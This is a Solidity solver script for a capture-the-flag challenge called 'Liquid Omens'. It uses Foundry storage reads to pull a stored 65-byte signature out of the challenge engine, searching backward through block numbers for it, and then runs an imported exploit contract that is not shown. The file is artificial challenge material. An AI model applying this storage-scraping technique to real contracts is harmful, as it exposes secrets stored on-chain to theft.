// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-ctf/CTFSolver.sol";

import "src/Challenge.sol";
import "script/exploit/Exploit.sol";

contract Solve is CTFSolver {
    bytes32 private constant DIRECTIVE_KEY_DOMAIN = keccak256("LIQUID_OMENS_DIRECTIVE_KEY_V1");
    bytes32 private constant DIRECTIVE_JOURNAL_DOMAIN = keccak256("LIQUID_OMENS_DIRECTIVE_JOURNAL_V1");

    function solve(address challengeAddress, address player) internal override {
        Challenge challenge = Challenge(challengeAddress);
        bytes memory signature = _loadDirective(address(challenge.engine()), player, _findDirectiveBlock(address(challenge.engine()), player));
        Exploit exploit = new Exploit(challenge, signature);

        exploit.exploit();

        require(challenge.isSolved(), "Not solved");
    }

    function _loadDirective(address target, address player, uint256 filingBlock) private view returns (bytes memory data) {
        uint256 filingKey = uint256(keccak256(abi.encode(DIRECTIVE_KEY_DOMAIN, player, filingBlock)));
        uint256 base = uint256(keccak256(abi.encode(DIRECTIVE_JOURNAL_DOMAIN, filingKey)));
        uint256 directiveLength = uint256(vm.load(target, bytes32(base)));
        data = new bytes(directiveLength);
        uint256 words = (directiveLength + 31) / 32;

        for (uint256 i = 0; i < words; ++i) {
            bytes32 word = vm.load(target, bytes32(base + i + 1));
            assembly {
                mstore(add(add(data, 0x20), mul(i, 0x20)), word)
            }
        }
    }

    function _findDirectiveBlock(address target, address player) private view returns (uint256 filingBlock) {
        for (uint256 candidate = block.number + 1; candidate > 0; --candidate) {
            uint256 blockNumber = candidate - 1;
            uint256 filingKey = uint256(keccak256(abi.encode(DIRECTIVE_KEY_DOMAIN, player, blockNumber)));
            uint256 base = uint256(keccak256(abi.encode(DIRECTIVE_JOURNAL_DOMAIN, filingKey)));

            if (uint256(vm.load(target, bytes32(base))) == 65) {
                return blockNumber;
            }
        }

        revert("Directive not found");
    }
}
